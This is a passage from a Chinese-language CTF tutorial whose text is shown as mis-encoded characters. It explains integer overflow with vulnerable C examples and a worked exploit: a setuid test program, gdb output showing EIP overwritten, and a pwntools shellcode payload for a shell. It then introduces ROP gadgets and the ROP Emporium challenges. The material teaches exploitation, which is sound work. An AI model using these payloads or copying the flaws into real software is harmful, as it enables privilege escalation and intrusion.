   0x0000061a &lt;+173&gt;:   push   eax
   0x0000061b &lt;+174&gt;:   lea    eax,[ebx-0x18ea]
   0x00000621 &lt;+180&gt;:   push   eax
   0x00000622 &lt;+181&gt;:   call   0x3f0 &lt;printf@plt&gt;
   0x00000627 &lt;+186&gt;:   add    esp,0x10
   0x0000062a &lt;+189&gt;:   nop
   0x0000062b &lt;+190&gt;:   lea    esp,[ebp-0x8]
   0x0000062e &lt;+193&gt;:   pop    ecx
   0x0000062f &lt;+194&gt;:   pop    ebx
   0x00000630 &lt;+195&gt;:   pop    ebp
   0x00000631 &lt;+196&gt;:   lea    esp,[ecx-0x4]
   0x00000634 &lt;+199&gt;:   ret
End of assembler dump.
</code></pre>
<p>åœ¨æ•´æ•°è½¬æ¢çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰å¯èƒ½å¯¼è‡´ä¸‹é¢çš„é”™è¯¯ï¼š</p>
<ul>
<li>æŸå¤±å€¼ï¼šè½¬æ¢ä¸ºå€¼çš„å¤§å°ä¸èƒ½è¡¨ç¤ºçš„ä¸€ç§ç±»åž‹</li>
<li>æŸå¤±ç¬¦å·ï¼šä»Žæœ‰ç¬¦å·ç±»åž‹è½¬æ¢ä¸ºæ— ç¬¦å·ç±»åž‹ï¼Œå¯¼è‡´æŸå¤±ç¬¦å·</li>
</ul>
<h3 id="_21">æ¼æ´žå¤šå‘å‡½æ•°</h3>
<p>æˆ‘ä»¬è¯´è¿‡æ•´æ•°æº¢å‡ºè¦é…åˆä¸Šå…¶ä»–ç±»åž‹çš„ç¼ºé™·æ‰èƒ½æœ‰ç”¨ï¼Œä¸‹é¢çš„ä¸¤ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª <code>size_t</code> ç±»åž‹çš„å‚æ•°ï¼Œå¸¸å¸¸è¢«è¯¯ç”¨è€Œäº§ç”Ÿæ•´æ•°æº¢å‡ºï¼ŒæŽ¥ç€å°±å¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´žã€‚</p>
<pre><code class="language-c">#include &lt;string.h&gt;

void *memcpy(void *dest, const void *src, size_t n);
</code></pre>
<p><code>memcpy()</code> å‡½æ•°å°† <code>src</code> æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ä¸­ä»¥ <code>src</code> åœ°å€å¼€å§‹çš„å‰ <code>n</code> ä¸ªå­—èŠ‚å¤åˆ¶åˆ° <code>dest</code> æ‰€æŒ‡çš„æ•°ç»„ä¸­ï¼Œå¹¶è¿”å›ž <code>dest</code>ã€‚</p>
<pre><code class="language-c">#include &lt;string.h&gt;

char *strncpy(char *dest, const char *src, size_t n);
</code></pre>
<p><code>strncpy()</code> å‡½æ•°ä»Žæº <code>src</code> æ‰€æŒ‡çš„å†…å­˜åœ°å€çš„èµ·å§‹ä½ç½®å¼€å§‹å¤åˆ¶ <code>n</code> ä¸ªå­—èŠ‚åˆ°ç›®æ ‡ <code>dest</code> æ‰€æŒ‡çš„å†…å­˜åœ°å€çš„èµ·å§‹ä½ç½®ä¸­ã€‚</p>
<p>ä¸¤ä¸ªå‡½æ•°ä¸­éƒ½æœ‰ä¸€ä¸ªç±»åž‹ä¸º <code>size_t</code> çš„å‚æ•°ï¼Œå®ƒæ˜¯æ— ç¬¦å·æ•´åž‹çš„ <code>sizeof</code> è¿ç®—ç¬¦çš„ç»“æžœã€‚</p>
<pre><code class="language-c">typedef unsigned int size_t;
</code></pre>
<h2 id="_22">æ•´æ•°æº¢å‡ºç¤ºä¾‹</h2>
<p>çŽ°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº†æ•´æ•°æº¢å‡ºçš„åŽŸç†å’Œä¸»è¦å½¢å¼ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆçœ‹å‡ ä¸ªç®€å•ç¤ºä¾‹ï¼Œç„¶åŽå®žé™…æ“ä½œåˆ©ç”¨ä¸€ä¸ªæ•´æ•°æº¢å‡ºæ¼æ´žã€‚</p>
<h3 id="_23">ç¤ºä¾‹</h3>
<p>ç¤ºä¾‹ä¸€ï¼Œæ•´æ•°è½¬æ¢ï¼š</p>
<pre><code class="language-c">char buf[80];
void vulnerable() {
    int len = read_int_from_network();
    char *p = read_string_from_network();
    if (len &gt; 80) {
        error(&quot;length too large: bad dog, no cookie for you!&quot;);
        return;
    }
    memcpy(buf, p, len);
}
</code></pre>
<p>è¿™ä¸ªä¾‹å­çš„é—®é¢˜åœ¨äºŽï¼Œå¦‚æžœæ”»å‡»è€…ç»™ <code>len</code> èµ‹äºŽäº†ä¸€ä¸ªè´Ÿæ•°ï¼Œåˆ™å¯ä»¥ç»•è¿‡ <code>if</code> è¯­å¥çš„æ£€æµ‹ï¼Œè€Œæ‰§è¡Œåˆ° <code>memcpy()</code> çš„æ—¶å€™ï¼Œç”±äºŽç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ <code>size_t</code> ç±»åž‹ï¼Œè´Ÿæ•° <code>len</code> ä¼šè¢«è½¬æ¢ä¸ºä¸€ä¸ªæ— ç¬¦å·æ•´åž‹ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªéžå¸¸å¤§çš„æ­£æ•°ï¼Œä»Žè€Œå¤åˆ¶äº†å¤§é‡çš„å†…å®¹åˆ° <code>buf</code> ä¸­ï¼Œå¼•å‘äº†ç¼“å†²åŒºæº¢å‡ºã€‚</p>
<p>ç¤ºä¾‹äºŒï¼Œå›žç»•å’Œæº¢å‡ºï¼š</p>
<pre><code class="language-c">void vulnerable() {
    size_t len;
    // int len;
    char* buf;

    len = read_int_from_network();
    buf = malloc(len + 5);
    read(fd, buf, len);
    ...
}
</code></pre>
<p>è¿™ä¸ªä¾‹å­çœ‹ä¼¼é¿å¼€äº†ç¼“å†²åŒºæº¢å‡ºçš„é—®é¢˜ï¼Œä½†æ˜¯å¦‚æžœ <code>len</code> è¿‡å¤§ï¼Œ<code>len+5</code> æœ‰å¯èƒ½å‘ç”Ÿå›žç»•ã€‚æ¯”å¦‚è¯´ï¼Œåœ¨ x86-32 ä¸Šï¼Œå¦‚æžœ <code>len = 0xFFFFFFFF</code>ï¼Œåˆ™ <code>len+5 = 0x00000004</code>ï¼Œè¿™æ—¶ <code>malloc()</code> åªåˆ†é…äº† 4 å­—èŠ‚çš„å†…å­˜åŒºåŸŸï¼Œç„¶åŽåœ¨é‡Œé¢å†™å…¥å¤§é‡çš„æ•°æ®ï¼Œç¼“å†²åŒºæº¢å‡ºä¹Ÿå°±å‘ç”Ÿäº†ã€‚ï¼ˆå¦‚æžœå°† <code>len</code> å£°æ˜Žä¸ºæœ‰ç¬¦å· <code>int</code> ç±»åž‹ï¼Œ<code>len+5</code> å¯èƒ½å‘ç”Ÿæº¢å‡ºï¼‰</p>
<p>ç¤ºä¾‹ä¸‰ï¼Œæˆªæ–­ï¼š</p>
<pre><code class="language-text">void main(int argc, char *argv[]) {
    unsigned short int total;
    total = strlen(argv[1]) + strlen(argv[2]) + 1;
    char *buf = (char *)malloc(total);
    strcpy(buf, argv[1]);
    strcat(buf, argv[2]);
    ...
}
</code></pre>
<p>è¿™ä¸ªä¾‹å­æŽ¥å—ä¸¤ä¸ªå­—ç¬¦ä¸²ç±»åž‹çš„å‚æ•°å¹¶è®¡ç®—å®ƒä»¬çš„æ€»é•¿åº¦ï¼Œç¨‹åºåˆ†é…è¶³å¤Ÿçš„å†…å­˜æ¥å­˜å‚¨æ‹¼æŽ¥åŽçš„å­—ç¬¦ä¸²ã€‚é¦–å…ˆå°†ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­ï¼Œç„¶åŽå°†ç¬¬äºŒä¸ªå‚æ•°è¿žæŽ¥åˆ°å°¾éƒ¨ã€‚å¦‚æžœæ”»å‡»è€…æä¾›çš„ä¸¤ä¸ªå­—ç¬¦ä¸²æ€»é•¿åº¦æ— æ³•ç”¨ <code>total</code> è¡¨ç¤ºï¼Œåˆ™ä¼šå‘ç”Ÿæˆªæ–­ï¼Œä»Žè€Œå¯¼è‡´åŽé¢çš„ç¼“å†²åŒºæº¢å‡ºã€‚</p>
<h3 id="_24">å®žæˆ˜</h3>
<p>çœ‹äº†ä¸Šé¢çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬æ¥çœŸæ­£åˆ©ç”¨ä¸€ä¸ªæ•´æ•°æº¢å‡ºæ¼æ´žã€‚<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/3.1.2_integer_overflow/integer.c">æºç </a></p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
void validate_passwd(char *passwd) {
    char passwd_buf[11];
    unsigned char passwd_len = strlen(passwd);
    if(passwd_len &gt;= 4 &amp;&amp; passwd_len &lt;= 8) {
        printf(&quot;good!\n&quot;);
        strcpy(passwd_buf, passwd);
    } else {
        printf(&quot;bad!\n&quot;);
    }
}

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf(&quot;error\n&quot;);
        return 0;
    }
    validate_passwd(argv[1]);
}
</code></pre>
<p>ä¸Šé¢çš„ç¨‹åºä¸­ <code>strlen()</code> è¿”å›žç±»åž‹æ˜¯ <code>size_t</code>ï¼Œå´è¢«å­˜å‚¨åœ¨æ— ç¬¦å·å­—ç¬¦ä¸²ç±»åž‹ä¸­ï¼Œä»»æ„è¶…è¿‡æ— ç¬¦å·å­—ç¬¦ä¸²æœ€å¤§ä¸Šé™å€¼ï¼ˆ256 å­—èŠ‚ï¼‰çš„æ•°æ®éƒ½ä¼šå¯¼è‡´æˆªæ–­å¼‚å¸¸ã€‚å½“å¯†ç é•¿åº¦ä¸º 261 æ—¶ï¼Œæˆªæ–­åŽå€¼å˜ä¸º 5ï¼ŒæˆåŠŸç»•è¿‡äº† <code>if</code> çš„åˆ¤æ–­ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚ä¸‹é¢æˆ‘ä»¬åˆ©ç”¨æº¢å‡ºæ¼æ´žæ¥èŽ·å¾— shellã€‚</p>
<p>ç¼–è¯‘å‘½ä»¤ï¼š</p>
<pre><code class="language-text"># echo 0 &gt; /proc/sys/kernel/randomize_va_space
$ gcc -g -fno-stack-protector -z execstack vuln.c
$ sudo chown root vuln
$ sudo chgrp root vuln
$ sudo chmod +s vuln
</code></pre>
<p>ä½¿ç”¨ gdb åæ±‡ç¼– <code>validate_passwd</code> å‡½æ•°ã€‚</p>
<pre><code class="language-text">gdb-peda$ disassemble validate_passwd
Dump of assembler code for function validate_passwd:
   0x0000059d &lt;+0&gt;:     push   ebp                            ; åŽ‹å…¥ ebp
   0x0000059e &lt;+1&gt;:     mov    ebp,esp
   0x000005a0 &lt;+3&gt;:     push   ebx                            ; åŽ‹å…¥ ebx
   0x000005a1 &lt;+4&gt;:     sub    esp,0x14
   0x000005a4 &lt;+7&gt;:     call   0x4a0 &lt;__x86.get_pc_thunk.bx&gt;
   0x000005a9 &lt;+12&gt;:    add    ebx,0x1a57
   0x000005af &lt;+18&gt;:    sub    esp,0xc
   0x000005b2 &lt;+21&gt;:    push   DWORD PTR [ebp+0x8]
   0x000005b5 &lt;+24&gt;:    call   0x430 &lt;strlen@plt&gt;
   0x000005ba &lt;+29&gt;:    add    esp,0x10
   0x000005bd &lt;+32&gt;:    mov    BYTE PTR [ebp-0x9],al         ; å°† len å­˜å…¥ [ebp-0x9]
   0x000005c0 &lt;+35&gt;:    cmp    BYTE PTR [ebp-0x9],0x3
   0x000005c4 &lt;+39&gt;:    jbe    0x5f2 &lt;validate_passwd+85&gt;
   0x000005c6 &lt;+41&gt;:    cmp    BYTE PTR [ebp-0x9],0x8
   0x000005ca &lt;+45&gt;:    ja     0x5f2 &lt;validate_passwd+85&gt;
   0x000005cc &lt;+47&gt;:    sub    esp,0xc
   0x000005cf &lt;+50&gt;:    lea    eax,[ebx-0x1910]
   0x000005d5 &lt;+56&gt;:    push   eax
   0x000005d6 &lt;+57&gt;:    call   0x420 &lt;puts@plt&gt;
   0x000005db &lt;+62&gt;:    add    esp,0x10
   0x000005de &lt;+65&gt;:    sub    esp,0x8
   0x000005e1 &lt;+68&gt;:    push   DWORD PTR [ebp+0x8]
   0x000005e4 &lt;+71&gt;:    lea    eax,[ebp-0x14]                ; å– passwd_buf åœ°å€
   0x000005e7 &lt;+74&gt;:    push   eax                           ; åŽ‹å…¥ passwd_buf
   0x000005e8 &lt;+75&gt;:    call   0x410 &lt;strcpy@plt&gt;
   0x000005ed &lt;+80&gt;:    add    esp,0x10
   0x000005f0 &lt;+83&gt;:    jmp    0x604 &lt;validate_passwd+103&gt;
   0x000005f2 &lt;+85&gt;:    sub    esp,0xc
   0x000005f5 &lt;+88&gt;:    lea    eax,[ebx-0x190a]
   0x000005fb &lt;+94&gt;:    push   eax
   0x000005fc &lt;+95&gt;:    call   0x420 &lt;puts@plt&gt;
   0x00000601 &lt;+100&gt;:   add    esp,0x10
   0x00000604 &lt;+103&gt;:   nop
   0x00000605 &lt;+104&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
   0x00000608 &lt;+107&gt;:   leave  
   0x00000609 &lt;+108&gt;:   ret
End of assembler dump.
</code></pre>
<p>é€šè¿‡é˜…è¯»åæ±‡ç¼–ä»£ç ï¼Œæˆ‘ä»¬çŸ¥é“ç¼“å†²åŒº <code>passwd_buf</code> ä½äºŽ <code>ebp=0x14</code> çš„ä½ç½®ï¼ˆ<code>0x000005e4 &lt;+71&gt;: lea eax,[ebp-0x14]</code>ï¼‰ï¼Œè€Œè¿”å›žåœ°å€åœ¨ <code>ebp+4</code> çš„ä½ç½®ï¼Œæ‰€ä»¥è¿”å›žåœ°å€ç›¸å¯¹äºŽç¼“å†²åŒº <code>0x18</code> çš„ä½ç½®ã€‚æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="language-text">gdb-peda$ r `python2 -c 'print &quot;A&quot;*24 + &quot;B&quot;*4 + &quot;C&quot;*233'`
Starting program: /home/a.out `python2 -c 'print &quot;A&quot;*24 + &quot;B&quot;*4 + &quot;C&quot;*233'`
good!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd0f4 ('A' &lt;repeats 24 times&gt;, &quot;BBBB&quot;, 'C' &lt;repeats 172 times&gt;...)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd490 --&gt; 0x534c0043 ('C')
EDX: 0xffffd1f8 --&gt; 0xffff0043 --&gt; 0x0
ESI: 0xf7f95000 --&gt; 0x1bbd90
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd110 ('C' &lt;repeats 200 times&gt;...)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd110 ('C' &lt;repeats 200 times&gt;...)
0004| 0xffffd114 ('C' &lt;repeats 200 times&gt;...)
0008| 0xffffd118 ('C' &lt;repeats 200 times&gt;...)
0012| 0xffffd11c ('C' &lt;repeats 200 times&gt;...)
0016| 0xffffd120 ('C' &lt;repeats 200 times&gt;...)
0020| 0xffffd124 ('C' &lt;repeats 200 times&gt;...)
0024| 0xffffd128 ('C' &lt;repeats 200 times&gt;...)
0028| 0xffffd12c ('C' &lt;repeats 200 times&gt;...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
</code></pre>
<p>å¯ä»¥çœ‹åˆ° <code>EIP</code> è¢« <code>BBBB</code> è¦†ç›–ï¼Œç›¸å½“äºŽæˆ‘ä»¬èŽ·å¾—äº†è¿”å›žåœ°å€çš„æŽ§åˆ¶æƒã€‚æž„å»ºä¸‹é¢çš„ payloadï¼š</p>
<pre><code class="language-python">from pwn import *

ret_addr = 0xffffd118     # ebp = 0xffffd108
shellcode = shellcraft.i386.sh()

payload = &quot;A&quot; * 24
payload += p32(ret_addr)
payload += &quot;\x90&quot; * 20
payload += asm(shellcode)
payload += &quot;C&quot; * 169      # 24 + 4 + 20 + 44 + 169 = 261
</code></pre>
<h2 id="314-rop">3.1.4 è¿”å›žå¯¼å‘ç¼–ç¨‹ï¼ˆROPï¼‰</h2>
<ul>
<li>ROP ç®€ä»‹</li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#å¯»æ‰¾-gadgets">å¯»æ‰¾ gadgets</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#å¸¸ç”¨çš„-gadgets">å¸¸ç”¨çš„ gadgets</a></li>
<li>ROP Emporium</li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#ret2win32">ret2win32</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#ret2win">ret2win</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#split32">split32</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#split">split</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#callme32">callme32</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#callme">callme</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#write432">write432</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#write4">write4</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#badchars32">badchars32</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#badchars">badchars</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#fluff32">fluff32</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#fluff">fluff</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#pivot32">pivot32</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#pivot">pivot</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.4_rop_x86.html#æ›´å¤šèµ„æ–™">æ›´å¤šèµ„æ–™</a></li>
</ul>
<h2 id="rop">ROP ç®€ä»‹</h2>
<p>è¿”å›žå¯¼å‘ç¼–ç¨‹ï¼ˆReturn-Oriented Programmingï¼Œç¼©å†™ï¼šROPï¼‰æ˜¯ä¸€ç§é«˜çº§çš„å†…å­˜æ”»å‡»æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å…è®¸æ”»å‡»è€…åœ¨çŽ°ä»£æ“ä½œç³»ç»Ÿçš„å„ç§é€šç”¨é˜²å¾¡ä¸‹æ‰§è¡Œä»£ç ï¼Œå¦‚å†…å­˜ä¸å¯æ‰§è¡Œå’Œä»£ç ç­¾åç­‰ã€‚è¿™ç±»æ”»å‡»å¾€å¾€åˆ©ç”¨æ“ä½œå †æ ˆè°ƒç”¨æ—¶çš„ç¨‹åºæ¼æ´žï¼Œé€šå¸¸æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚æ”»å‡»è€…æŽ§åˆ¶å †æ ˆè°ƒç”¨ä»¥åŠ«æŒç¨‹åºæŽ§åˆ¶æµå¹¶æ‰§è¡Œé’ˆå¯¹æ€§çš„æœºå™¨è¯­è¨€æŒ‡ä»¤åºåˆ—ï¼ˆgadgetsï¼‰ï¼Œæ¯ä¸€æ®µ gadget é€šå¸¸ä»¥ return æŒ‡ä»¤ï¼ˆ<code>ret</code>ï¼Œæœºå™¨ç ä¸º<code>c3</code>ï¼‰ç»“æŸï¼Œå¹¶ä½äºŽå…±äº«åº“ä»£ç ä¸­çš„å­ç¨‹åºä¸­ã€‚é€šè¿‡æ‰§è¡Œè¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œä¹Ÿå°±æŽ§åˆ¶äº†ç¨‹åºçš„æ‰§è¡Œã€‚</p>
<p><code>ret</code> æŒ‡ä»¤ç›¸å½“äºŽ <code>pop eip</code>ã€‚å³ï¼Œé¦–å…ˆå°† <code>esp</code> æŒ‡å‘çš„ 4 å­—èŠ‚å†…å®¹è¯»å–å¹¶èµ‹å€¼ç»™ <code>eip</code>ï¼Œç„¶åŽ <code>esp</code> åŠ ä¸Š 4 å­—èŠ‚æŒ‡å‘æ ˆçš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚å¦‚æžœå½“å‰æ‰§è¡Œçš„æŒ‡ä»¤åºåˆ—ä»ç„¶ä»¥ <code>ret</code> æŒ‡ä»¤ç»“æŸï¼Œåˆ™è¿™ä¸ªè¿‡ç¨‹å°†é‡å¤ï¼Œ <code>esp</code> å†æ¬¡å¢žåŠ å¹¶ä¸”æ‰§è¡Œä¸‹ä¸€ä¸ªæŒ‡ä»¤åºåˆ—ã€‚</p>
<h3 id="gadgets">å¯»æ‰¾ gadgets</h3>
<ol>
<li>åœ¨ç¨‹åºä¸­å¯»æ‰¾æ‰€æœ‰çš„ c3ï¼ˆretï¼‰ å­—èŠ‚</li>
<li>å‘å‰æœç´¢ï¼Œçœ‹å‰é¢çš„å­—èŠ‚æ˜¯å¦åŒ…å«ä¸€ä¸ªæœ‰æ•ˆæŒ‡ä»¤ï¼Œè¿™é‡Œå¯ä»¥æŒ‡å®šæœ€å¤§æœç´¢å­—èŠ‚æ•°ï¼Œä»¥èŽ·å¾—ä¸åŒé•¿åº¦çš„ gadgets</li>
<li>è®°å½•ä¸‹æˆ‘ä»¬æ‰¾åˆ°çš„æ‰€æœ‰æœ‰æ•ˆæŒ‡ä»¤åºåˆ—</li>
</ol>
<p>ç†è®ºä¸Šæˆ‘ä»¬æ˜¯å¯ä»¥è¿™æ ·å¯»æ‰¾ gadgets çš„ï¼Œä½†å®žé™…ä¸Šæœ‰å¾ˆå¤šå·¥å…·å¯ä»¥å®Œæˆè¿™ä¸ªå·¥ä½œï¼Œå¦‚ ROPgadgetï¼ŒRopper ç­‰ã€‚æ›´å®Œæ•´çš„æœç´¢å¯ä»¥ä½¿ç”¨ http://ropshell.com/ã€‚</p>
<h3 id="gadgets_1">å¸¸ç”¨çš„ gadgets</h3>
<p>å¯¹äºŽ gadgets èƒ½åšçš„äº‹æƒ…ï¼ŒåŸºæœ¬ä¸Šåªè¦ä½ æ•¢æƒ³ï¼Œå®ƒå°±æ•¢æ‰§è¡Œã€‚ä¸‹é¢ç®€å•ä»‹ç»å‡ ç§ç”¨æ³•ï¼š</p>
<ul>
<li>ä¿å­˜æ ˆæ•°æ®åˆ°å¯„å­˜å™¨</li>
<li>å°†æ ˆé¡¶çš„æ•°æ®æŠ›å‡ºå¹¶ä¿å­˜åˆ°å¯„å­˜å™¨ä¸­ï¼Œç„¶åŽè·³è½¬åˆ°æ–°çš„æ ˆé¡¶åœ°å€ã€‚æ‰€ä»¥å½“è¿”å›žåœ°å€è¢«ä¸€ä¸ª gadgets çš„åœ°å€è¦†ç›–ï¼Œç¨‹åºå°†åœ¨è¿”å›žåŽæ‰§è¡Œè¯¥æŒ‡ä»¤åºåˆ—ã€‚</li>
<li>å¦‚ï¼š<code>pop eax; ret</code></li>
<li>ä¿å­˜å†…å­˜æ•°æ®åˆ°å¯„å­˜å™¨</li>
<li>å°†å†…å­˜åœ°å€å¤„çš„æ•°æ®åŠ è½½åˆ°å†…å­˜å™¨ä¸­ã€‚</li>
<li>å¦‚ï¼š<code>mov ecx,[eax]; ret</code></li>
<li>ä¿å­˜å¯„å­˜å™¨æ•°æ®åˆ°å†…å­˜</li>
<li>å°†å¯„å­˜å™¨çš„å€¼ä¿å­˜åˆ°å†…å­˜åœ°å€å¤„ã€‚</li>
<li>å¦‚ï¼š<code>mov [eax],ecx; ret</code></li>
<li>ç®—æ•°å’Œé€»è¾‘è¿ç®—</li>
<li>add, sub, mul, xor ç­‰ã€‚</li>
<li>å¦‚ï¼š<code>add eax,ebx; ret</code>, <code>xor edx,edx; ret</code></li>
<li>ç³»ç»Ÿè°ƒç”¨</li>
<li>æ‰§è¡Œå†…æ ¸ä¸­æ–­</li>
<li>å¦‚ï¼š<code>int 0x80; ret</code>, <code>call gs:[0x10]; ret</code></li>
<li>ä¼šå½±å“æ ˆå¸§çš„ gadgets</li>
<li>è¿™äº› gadgets ä¼šæ”¹å˜ ebp çš„å€¼ï¼Œä»Žè€Œå½±å“æ ˆå¸§ï¼Œåœ¨ä¸€äº›æ“ä½œå¦‚ stack pivot æ—¶æˆ‘ä»¬éœ€è¦è¿™æ ·çš„æŒ‡ä»¤æ¥è½¬ç§»æ ˆå¸§ã€‚</li>
<li>å¦‚ï¼š<code>leave; ret</code>, <code>pop ebp; ret</code></li>
</ul>
<h2 id="rop-emporium">ROP Emporium</h2>
<p><a href="https://ropemporium.com/">ROP Emporium</a> æä¾›äº†ä¸€ç³»åˆ—ç”¨äºŽå­¦ä¹  ROP çš„æŒ‘æˆ˜ï¼Œæ¯ä¸€ä¸ªæŒ‘æˆ˜éƒ½ä»‹ç»äº†ä¸€ä¸ªçŸ¥è¯†ï¼Œéš¾åº¦ä¹Ÿé€æ¸å¢žåŠ ï¼Œæ˜¯å¾ªåºæ¸è¿›å­¦ä¹  ROP çš„å¥½èµ„æ–™ã€‚ROP Emporium è¿˜æœ‰ä¸ªç‰¹ç‚¹æ˜¯å®ƒä¸“æ³¨äºŽ ROPï¼Œæ‰€æœ‰æŒ‘æˆ˜éƒ½æœ‰ç›¸åŒçš„æ¼æ´žç‚¹ï¼Œä¸åŒçš„åªæ˜¯ ROP é“¾æž„é€ çš„ä¸åŒï¼Œæ‰€ä»¥ä¸æ¶‰åŠå…¶ä»–çš„æ¼æ´žåˆ©ç”¨å’Œé€†å‘çš„å†…å®¹ã€‚æ¯ä¸ªæŒ‘æˆ˜éƒ½åŒ…å«äº† 32 ä½å’Œ 64 ä½çš„ç¨‹åºï¼Œé€šè¿‡å¯¹æ¯”èƒ½å¸®åŠ©æˆ‘ä»¬ç†è§£ ROP é“¾åœ¨ä¸åŒä½“ç³»ç»“æž„ä¸‹çš„å·®å¼‚ï¼Œä¾‹å¦‚å‚æ•°çš„ä¼ é€’ç­‰ã€‚è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å°±ä»Žè¿™äº›æŒ‘æˆ˜ä¸­æ¥å­¦ä¹ å§ã€‚</p>
<p>è¿™äº›æŒ‘æˆ˜éƒ½åŒ…å«ä¸€ä¸ª <code>flag.txt</code> çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯é€šè¿‡æŽ§åˆ¶ç¨‹åºæ‰§è¡Œï¼Œæ¥æ‰“å°å‡ºæ–‡ä»¶ä¸­çš„å†…å®¹ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥å°è¯•èŽ·å¾— shellã€‚</p>
<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/3.1.4_rop/rop_emporium.bin">ä¸‹è½½æ–‡ä»¶</a></p>
<h3 id="ret2win32">ret2win32</h3>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¯¹äºŽä¸€ä¸ªæœ‰ç¼“å†²åŒºæº¢å‡ºçš„ç¨‹åºï¼Œæˆ‘ä»¬é€šå¸¸å…ˆè¾“å…¥ä¸€å®šæ•°é‡çš„å­—ç¬¦å¡«æ»¡ç¼“å†²åŒºï¼Œç„¶åŽæ˜¯ç²¾å¿ƒæž„é€ çš„ ROP é“¾ï¼Œé€šè¿‡è¦†ç›–å †æ ˆä¸Šä¿å­˜çš„è¿”å›žåœ°å€æ¥å®žçŽ°å‡½æ•°è·³è½¬ï¼ˆå…³äºŽç¼“å†²åŒºæº¢å‡ºè¯·æŸ¥çœ‹ä¸Šä¸€ç«  3.1.3æ ˆæº¢å‡ºï¼‰ã€‚</p>
<p>ç¬¬ä¸€ä¸ªæŒ‘æˆ˜æˆ‘ä¼šå°½é‡è¯¦ç»†ä¸€ç‚¹ï¼Œå› ä¸ºæ‰€æœ‰æŒ‘æˆ˜ç¨‹åºéƒ½æœ‰ç›¸ä¼¼çš„ç»“æž„ï¼Œç¼“å†²åŒºå¤§å°éƒ½ä¸€æ ·ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ¼æ´žå‡½æ•°ï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
   0x080485f6 &lt;+0&gt;:     push   ebp
   0x080485f7 &lt;+1&gt;:     mov    ebp,esp
   0x080485f9 &lt;+3&gt;:     sub    esp,0x28
   0x080485fc &lt;+6&gt;:     sub    esp,0x4
   0x080485ff &lt;+9&gt;:     push   0x20
   0x08048601 &lt;+11&gt;:    push   0x0
   0x08048603 &lt;+13&gt;:    lea    eax,[ebp-0x28]
   0x08048606 &lt;+16&gt;:    push   eax
   0x08048607 &lt;+17&gt;:    call   0x8048460 &lt;memset@plt&gt;
   0x0804860c &lt;+22&gt;:    add    esp,0x10
   0x0804860f &lt;+25&gt;:    sub    esp,0xc
   0x08048612 &lt;+28&gt;:    push   0x804873c
   0x08048617 &lt;+33&gt;:    call   0x8048420 &lt;puts@plt&gt;
   0x0804861c &lt;+38&gt;:    add    esp,0x10
   0x0804861f &lt;+41&gt;:    sub    esp,0xc
